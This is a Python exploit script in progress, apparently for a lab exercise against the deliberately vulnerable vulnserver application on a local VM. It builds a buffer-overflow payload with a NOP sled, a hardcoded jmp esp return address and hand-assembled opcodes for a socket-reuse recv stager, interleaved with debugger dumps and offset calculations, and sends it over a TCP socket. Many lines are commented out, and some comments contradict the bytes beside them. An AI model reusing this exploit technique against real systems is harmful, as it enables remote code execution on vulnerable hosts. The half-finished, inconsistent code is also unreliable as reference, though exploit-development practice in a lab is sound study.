
#!/usr/bin/env python3

from socket import socket, AF_INET, SOCK_STREAM, timeout, error
from struct import pack
from sys import exit
from time import sleep

# CONSTANTS
rhost = "10.10.11.11"
rport = 4321
target = (rhost, rport)
timeout_val = 10  # seconds


#00B6FA0C   0000007C  |...  |Socket = 7C
#00401953  |. E8 D40B0000    |CALL <JMP.&WS2_32.recv>                 ; \recv
#CALL 0040252C


#EIP is at 00B6FA0C when initial stop at breakpoint
#closest address of file descriptor?
#

#00B6F78F   007C00 00        ADD BYTE PTR DS:[EAX+EAX],BH
#00B6FB93   007C00 00        ADD BYTE PTR DS:[EAX+EAX],BH


#Enter Address #1: 00B6FA0C
#Enter Address #2: 00B6F78F
#[+] Hex offset: 0x27d
#[+] Decimal offset: 637

#Enter Address #1: 00B6FA0C
#Enter Address #2: 00B6FB93
#[+] Hex offset: 0x187
#[+] Decimal offset: 391

#00B6F9C6   54               PUSH ESP
#00B6F9C7   59               POP ECX
#00B6F9C8   66:81C1 8701     ADD CX,187


exploit = b"HELP "
exploit += b"\x90" * 7


 #   b"\x54"  # PUSH ESP
  #  b"\x59"  # POP ECX
   # b"\x66\x81\xC1\x87\x01"  # ADD CX,187
#)
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 5000 -q 41326341
# [*] Exact match at offset 66
#exploit += b"\x90" * (66 - len(exploit))

#exploit = b"A" * 66
# Message=  0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll]
# ASLR: False, Rebase: False, SafeSEH: False, OS: True, v-1.0-
# \\vmware-host\Shared Folders\WindowsVMs\VulnerableApps\vulnserver\essfunc.dll
#exploit += pack("<L", 0x7c82385d)
#exploit += pack("<L", 0x7c82385d)
exploit += b'\x5d\x38\x82\x7c'



# 00B7FA0C  ^EB B8            JMP SHORT 00B7F9C6
# JMP -72 (decimal) bytes

#exploit = (
 #   b"\x54"                     # PUSH ESP
  #  b"\x59"                     # POP ECX
   # b"\x66\x81\xC1\x87\x01"     # ADD CX,187
    #b"\x33\xD2"                 # XOR EDX,EDX
  #  b"\x52"                     # PUSH EDX 
    #b"\x80\xC6\x02"             # ADD DH,2
    #b"\x52"                     # PUSH EDX
   # b"\x54"                     # PUSH ESP
   # b"\x5A"                     # POP EDX
   # b"\x80\xEA\x2A"             # SUB DL,2A
   # b"\x52"                     # PUSH EDX
  #  b"\xFF\x31"                 # PUSH DWORD PTR DS:[ECX]
  #  b"\xE8\x4B\x2B\x88\xFF"     # CALL <JMP.&WS2_32.recv>
#)
#exploit += b"\B" * 4
#payload = []

exploit += b"\x90" * 2

payload = (
   # b"\x54"  # PUSH ESP
    #b"\x58"  # POP EAX
#    b"\x66\x81\xC1\x0D\x02"  # ADD AX,187
    #b"\x66\x05\x0D\x02"  # ADD AX,0x20d

#so these lines push the  socket descriptor to eax register


   b"\x83\xEC\x64" #SUB ESP,64
#moves stack pointer back so we don't overwrite it - who the fuck knows why or how
#0022FBB1   83EC 64          SUB ESP,64


   b"\x33\xDB" #XOR EBX,EBX
#0022FBB4   33DB             
#sets flags to 0

   b"\x53" # PUSH EBX
#0022FBB6   53     

#puts it back on the stack        

   b"\x80\xC7\x04" #ADD BH,4
   b"\x53" # PUSH EBX

 #  b"\xFF\xD0" # PUSH EBX
# BUFFER SIZE AND PUTS IT ON STACK





















    #b"\x90\x90\x90\x90\x90\x90\x90\x90"
    b"\x33\xDB"
    b"\xBB\xC6\xFB\x22\x00"
  #  \x90\x90"
    b"\x53"
#0022FBAC   33DB             XOR EBX,EBX
#0022FBAE   BB C6FB2200      MOV EBX,22FBC6
#0022FBB3   53               PUSH EBX

#0022FBAC   33DB             XOR EBX,EBX
#0022FBAE   BB C6FB2200      MOV EBX,22FBC6
#0022FBB3   53               PUSH EBX




    b"\x33\xC0"
#0022FBAC   33C0             XOR EAX,EAX
#zeros eax
    b"\x04\x84"














#
 #   b"\x04\x52"
#0022FBAE   04 84            ADD AL,52
    b"\x50"

##### okayyy, this is the value, if this is not correct, 
#the value may need to be 0x52 
#may need to be 84, but fairly sure stack is hex



 #   b"\xE8\xE7\x27\x1D\x00"
#0022FBB4   E8 E7271D00      CALL <JMP.&WS2_32.recv>
#this is the call, add back later

#0022FBB1   E8 EA271D00      CALL <JMP.&WS2_32.recv>




#   b"\x54" #
 #  b"\x5B" #
  # b"\x81\xC3\x97\x00\x00\x00" #
   #b"\x53"

#0022FBB2   54               PUSH ESP
#0022FBB3   5B               POP EBX
#0022FBB4   81C3 97000000    ADD EBX,97
#0022FBBA   53               PUSH EBX




#0022FBB3   54               PUSH ESP
#0022FBB4   5B               POP EBX
#0022FBB5   81C3 96000000    ADD EBX,96
#0022FBBB   53               PUSH EBX

   # b"\x54\x58\x04\x4b\x04\x4b\x50\x5c"


#Enter Address #1: 0022FB30
#Enter Address #2: 0022FBC6
#[+] Hex offset: 0x96
#[+] Decimal offset: 150
#[-] ESP Sub Adjust Opcodes: \x54\x58\x2c\x4b\x2c\x4b\x50\x5c
#[+] ESP Add Adjust Opcodes: \x54\x58\x04\x4b\x04\x4b\x50\x5c



  #  b"\xFF\x30"
 #   b"\xFF\x00"

)
#0022FBA2   66:81C1 2505     ADD CX,525


#EXPLOIT PAYLOAD GOES HERE


#exploit += payload
#42 appears t
exploit += payload
exploit += b"\x90" * (41 - len(payload))
#exploit += b"\xCC" * (2 - len(payload))
exploit += b"(" 


print(exploit)

#CALL 0040252C

#payload = b"KSTET /.:/"
#payload += exploit

if __name__ == '__main__':
    print('[*] creating the socket')
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(timeout_val)
    try:
        print('[*] connecting to the target')
        s.connect(target)
        print('[*] sending exploit')
        s.send(exploit)
        print('[*] sending out payload value')
        sleep(1)
    #    s.send(b"\xCC" * 512)

        print('[*] cleaning up')
        s.close()
    except timeout:
        print('[!] socket timeout occurred, have you tried:')
        print('\t* ensure the debugger is not in a paused state')
        print('\t* checking if the VM is connected to the right virt network?')
        exit(1)
    except error:
        print('[!] a socket error occurred, is the host up?')
        exit(1)
    except KeyboardInterrupt:
        print()  # drop us below the ^C
        print('[!] user initiated cancel, exiting...')
        exit(1)